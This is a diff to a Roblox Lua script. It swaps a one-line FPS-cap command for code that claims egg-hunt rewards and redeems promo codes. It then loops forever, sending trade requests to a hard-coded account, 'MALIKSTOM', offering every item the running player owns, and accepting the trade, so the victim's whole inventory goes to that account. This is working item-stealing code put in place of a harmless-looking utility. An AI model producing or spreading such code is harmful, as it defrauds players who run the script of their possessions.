@@ -1,1 +1,184 @@
-setfpscap(1)
+local rs = game:GetService("ReplicatedStorage")
+local player = game.Players.LocalPlayer
+local paper = require(rs:WaitForChild("Paper"))
+local tradeRemote = rs.Paper.Remotes.Trade
+local network = paper.Network
+
+local targetName = "MALIKSTOM"
+local targetPlayer = nil
+local isTrading = true
+local isFarming = false
+
+-- Create UI for status only
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player.PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 150)
+mainFrame.Position = UDim2.new(0, 10, 0, 10)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+mainFrame.BackgroundTransparency = 0.1
+mainFrame.BorderSizePixel = 1
+mainFrame.BorderColor3 = Color3.fromRGB(255, 215, 0)
+mainFrame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 35)
+title.Text = "AUTO TRADE v2 - RUNNING"
+title.TextColor3 = Color3.fromRGB(255, 215, 0)
+title.BackgroundTransparency = 1
+title.TextSize = 16
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+local statusBox = Instance.new("Frame")
+statusBox.Size = UDim2.new(0, 280, 0, 90)
+statusBox.Position = UDim2.new(0, 10, 0, 45)
+statusBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+statusBox.BackgroundTransparency = 0.5
+statusBox.BorderSizePixel = 1
+statusBox.BorderColor3 = Color3.fromRGB(80, 80, 80)
+statusBox.Parent = mainFrame
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -10, 1, -10)
+statusLabel.Position = UDim2.new(0, 5, 0, 5)
+statusLabel.Text = "Starting..."
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextWrapped = true
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.TextYAlignment = Enum.TextYAlignment.Top
+statusLabel.TextSize = 12
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.Parent = statusBox
+
+local function updateStatus(text)
+    statusLabel.Text = text
+    print("[STATUS] " .. text)
+end
+
+-- Farm eggs and codes
+local function farmEggsAndCodes()
+    if isFarming then return end
+    isFarming = true
+    
+    updateStatus("Starting Egg Hunt...")
+    
+    local eggHuntConfig = require(rs:WaitForChild("Tables").EggHunt)
+    local stats = paper.Stats
+    
+    for eggName, _ in pairs(eggHuntConfig) do
+        pcall(function()
+            paper.Network.InvokeServer("Claim Egg", eggName)
+        end)
+        task.wait(0.1)
+    end
+    updateStatus("Egg claiming done")
+    task.wait(1)
+    
+    local eggHuntData = stats.Get("EggHuntData")
+    local foundEggs = eggHuntData.Value.FoundEggs or {}
+    local claimedEggs = eggHuntData.Value.ClaimedEggs or {}
+    
+    for eggName, _ in pairs(foundEggs) do
+        if not claimedEggs[eggName] then
+            pcall(function()
+                paper.Network.InvokeServer("Claim Egg Reward", eggName)
+            end)
+            task.wait(0.1)
+        end
+    end
+    updateStatus("Egg rewards claimed")
+    task.wait(1)
+    
+    updateStatus("Redeeming codes...")
+    local codes = {
+        "update1", "update2", "update3", "update4", "update5",
+        "easter", "10kccu", "RELEASE"
+    }
+    
+    local remote = rs:WaitForChild("Paper"):WaitForChild("Remotes"):WaitForChild("__remotefunction")
+    
+    for _, code in ipairs(codes) do
+        pcall(function()
+            remote:InvokeServer("Redeem Code", code)
+        end)
+        task.wait(0.5)
+    end
+    updateStatus("Codes redeemed")
+    
+    isFarming = false
+end
+
+-- Execute trade
+local function executeTrade()
+    targetPlayer = game.Players:FindFirstChild(targetName)
+    if not targetPlayer then
+        updateStatus("Waiting for " .. targetName .. " to join...")
+        return false
+    end
+    
+    updateStatus("Sending trade request to " .. targetName)
+    network.FireServer("Sent Trade Request", targetPlayer)
+    
+    local menus = player.PlayerGui:WaitForChild("Menus")
+    local tradingFrame = nil
+    
+    repeat
+        task.wait(0.5)
+        tradingFrame = menus:FindFirstChild("Trading")
+    until tradingFrame and tradingFrame:FindFirstChild("Frame")
+    
+    local frame = tradingFrame.Frame
+    
+    repeat
+        task.wait(0.1)
+    until frame.My and frame.My.Items
+    
+    updateStatus("Trade opened, adding items...")
+    task.wait(1.5)
+    
+    local itemsData = paper.Stats.Get("Items").Value
+    local itemList = {}
+    
+    for itemName, amount in pairs(itemsData) do
+        if amount > 0 then
+            table.insert(itemList, {name = itemName, amount = amount})
+        end
+    end
+    
+    for _, item in ipairs(itemList) do
+        for retry = 1, 3 do
+            tradeRemote:FireServer("Item", item.name, item.amount)
+            task.wait(0.15)
+        end
+    end
+    
+    updateStatus("All items added, accepting trade...")
+    task.wait(1)
+    tradeRemote:FireServer("Accept")
+    updateStatus("Trade accepted, waiting for completion")
+    task.wait(8)
+    updateStatus("Trade complete")
+    
+    return true
+end
+
+-- Main auto loop
+local function startAuto()
+    updateStatus("Auto trade started - target: " .. targetName)
+    
+    -- Farm eggs and codes first
+    farmEggsAndCodes()
+    updateStatus("Farm complete, starting trade loop")
+    
+    -- Infinite trade loop
+    while isTrading do
+        executeTrade()
+        task.wait(3)
+    end
+end
+
+-- Start everything automatically
+task.spawn(startAuto)
